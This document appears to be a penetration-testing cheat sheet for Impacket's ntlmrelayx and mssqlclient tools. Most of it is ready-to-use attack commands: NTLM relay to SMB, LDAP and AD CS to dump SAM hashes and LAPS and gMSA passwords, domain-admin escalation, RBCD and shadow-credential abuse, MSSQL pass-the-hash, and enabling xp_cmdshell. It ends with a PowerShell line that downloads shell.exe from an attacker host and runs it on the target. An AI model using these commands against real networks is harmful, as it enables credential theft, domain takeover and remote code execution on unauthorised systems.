title: Impacket — Relay and MSSQL
html:
Impacket — Relay and MSSQL

Quick Reference

Tool Purpose
ntlmrelayx.py Relay captured NTLM auth to SMB/LDAP/MSSQL/HTTP targets
mssqlclient.py MSSQL TDS client — interactive shell, xp_cmdshell, file read

ntlmrelayx.py

For every incoming NTLM authentication, relay it to one or more targets. Supports SMB, LDAP, MSSQL, HTTP, IMAP, and AD CS relay attacks.

Syntax:

ntlmrelayx.py [options] -t <target>

Common Usage:

# SMB relay → dump SAM (no command = secretsdump)
ntlmrelayx.py -t smb://<target> -smb2support

# SMB relay → execute command
ntlmrelayx.py -t smb://<target> -smb2support -c <command>

# SMB relay → execute file
ntlmrelayx.py -t smb://<target> -smb2support -e /path/to/payload.exe

# SMB relay → interactive SMB shell (connect via netcat on port 11000)
ntlmrelayx.py -t smb://<target> -smb2support -i

# LDAP relay → dump LDAP info + attempt to add DA
ntlmrelayx.py -t ldap://<dc-ip> -smb2support

# LDAP relay → set RBCD (delegate-access for relayed machine account)
ntlmrelayx.py -t ldap://<dc-ip> -smb2support --delegate-access

# LDAP relay → escalate specific user to DA
ntlmrelayx.py -t ldap://<dc-ip> -smb2support --escalate-user <username>

# LDAP relay → dump LAPS
ntlmrelayx.py -t ldap://<dc-ip> -smb2support --dump-laps

# LDAP relay → dump gMSA
ntlmrelayx.py -t ldap://<dc-ip> -smb2support --dump-gmsa

# HTTP → SMB relay (WebDAV/NTLM auth on HTTP port)
ntlmrelayx.py -t smb://<target> --no-smb-server --http-port 80 -smb2support

# Multi-target from file
ntlmrelayx.py -tf targets.txt -smb2support

# SOCKS proxy mode (reuse session after relay)
ntlmrelayx.py -t smb://<target> -smb2support -socks

# CVE-2019-1040 (drop MIC, relay signing-required connections)
ntlmrelayx.py -t smb://<target> -smb2support --remove-mic

# AD CS ESC8 relay — get certificate for impersonated user
ntlmrelayx.py -t http://<ca-host>/certsrv/certfnsh.asp --adcs --template User

# AD CS — relay DC machine account for DomainController template
ntlmrelayx.py -t http://<ca-host>/certsrv/certfnsh.asp --adcs --template DomainController

# Shadow Credentials relay
ntlmrelayx.py -t ldap://<dc-ip> --shadow-credentials --shadow-target <target-account>

# IPv6 listener
ntlmrelayx.py -t smb://<target> -smb2support -6

# Keep relaying (don't stop after first success)
ntlmrelayx.py -t smb://<target> -smb2support --keep-relaying

# Store loot in directory
ntlmrelayx.py -t smb://<target> -smb2support -l /tmp/loot

# Disable SMB server (only listen on HTTP)
ntlmrelayx.py -t smb://<target> --no-smb-server --http-port 8080

Key Options:
- -t <target> — Relay target (smb://, ldap://, ldaps://, mssql://, http://)
- -tf <file> — File of relay targets
- -smb2support — Enable SMB2 (almost always needed)
- -c <command> — Command to run on SMB target
- -e <file> — File to execute on SMB target
- -i / --interactive — Launch interactive shell (SMB/LDAP/SQL)
- -socks — SOCKS proxy mode (port 1080)
- -l <dir> / --lootdir <dir> — Directory for loot
- -of <file> — Output file for NTLMv2 hashes
- -dh / --dump-hashes — Show hashes in console
- --remove-mic — Drop MIC (CVE-2019-1040)
- --keep-relaying — Keep relaying after first success
- --no-multirelay — Disable multi-host relay
- -ip <ip> — Bind interface IP
- --smb-port <port> — SMB listener port (default 445)
- --http-port <port> — HTTP listener port(s)
- -6 / --ipv6 — Listen on IPv6
- -wh <host> / --wpad-host <host> — Serve WPAD for proxy auth capture

LDAP-specific:
- --no-dump — Don't dump LDAP
- --no-da — Don't attempt to add DA
- --no-acl — Disable ACL attacks
- --escalate-user <username> — Escalate specific user via ACL
- --delegate-access — RBCD delegation on relayed computer
- --dump-laps — Dump LAPS passwords
- --dump-gmsa — Dump gMSA passwords
- --dump-adcs — Dump ADCS info
- --add-dns-record <name> <ip> — Add DNS record via LDAP

AD CS (ESC8):
- --adcs — Enable ADCS relay attack
- --template <template> — Certificate template name
- --altname <name> — Subject Alternative Name (ESC1/ESC6)

Shadow Credentials:
- --shadow-credentials — Enable shadow creds attack
- --shadow-target <account> — Target account for msDS-KeyCredentialLink
- --export-type {PEM,PFX} — Certificate export format
- --cert-outfile-path <path> — Output path for cert

Notes:
- SMB signing must be disabled on the target for SMB relay to work
- Check with CheckLDAPStatus.py / DumpNTLMInfo.py before attacking
- SOCKS mode: after relay, use proxychains with any tool against 127.0.0.1:1080
- Interactive mode: nc 127.0.0.1 11000 for SMB shell

mssqlclient.py

TDS client for Microsoft SQL Server — interactive SQL shell with support for xp_cmdshell, file ops, and linked server abuse.

Syntax:

mssqlclient.py [options] <domain>/<username>:<password>@<target>

Common Usage:

# Connect with SQL auth
mssqlclient.py <username>:<password>@<target>

# Connect with Windows auth
mssqlclient.py -windows-auth <domain>/<username>:<password>@<target>

# Pass-the-Hash (Windows auth)
mssqlclient.py -windows-auth -hashes <lm-hash>:<nt-hash> <domain>/<username>@<target>

# Kerberos (ccache)
KRB5CCNAME=<ticket> mssqlclient.py -k -no-pass -windows-auth <domain>/<username>@<target>

# Specific database
mssqlclient.py <username>:<password>@<target> -db master

# Custom port
mssqlclient.py <username>:<password>@<target> -port 1434

# Run command directly (non-interactive)
mssqlclient.py <username>:<password>@<target> -command "SELECT @@version"

Shell Commands (once connected):

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell '<command>';

-- Read file (requires BULK INSERT permissions)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS Data;

-- Read file via xp_cmdshell
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\root.txt';

-- Write file (via xp_cmdshell)
EXEC xp_cmdshell 'echo test > C:\Windows\Temp\test.txt';

-- List linked servers
SELECT name FROM sys.servers;

-- Execute on linked server
EXEC ('EXEC xp_cmdshell ''whoami''') AT [<linked-server>];

-- Check current user and privileges
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');

-- List databases
SELECT name FROM sys.databases;

-- Check users
SELECT name, type_desc FROM sys.server_principals;

Impacket shell helper commands:

enable_xp_cmdshell      — Enable xp_cmdshell in one command
xp_cmdshell <command>   — Run OS command

Options:
- -windows-auth — Windows/domain authentication (default: SQL auth)
- -hashes <lm-hash>:<nt-hash> — NTLM hash auth (requires -windows-auth)
- -k / -no-pass — Kerberos via ccache
- -aesKey <aes256-key> — AES Kerberos key
- -dc-ip <dc-ip> — DC IP (for Kerberos)
- -target-ip <target> — Target IP override
- -port <port> — MSSQL port (default: 1433)
- -db <db> — Database instance to connect to
- -command <cmd> — SQL command(s) to run non-interactively
- -file <file> — File of SQL commands to run
- --host-name <name> — HostName property in connection string
- --app-name <name> — AppName property in connection string
- -show — Print queries as they run

Upload file via xp_cmdshell:

-- PowerShell download to target
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(''http://<attacker>/shell.exe'',''C:\Windows\Temp\shell.exe'')"';
EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';
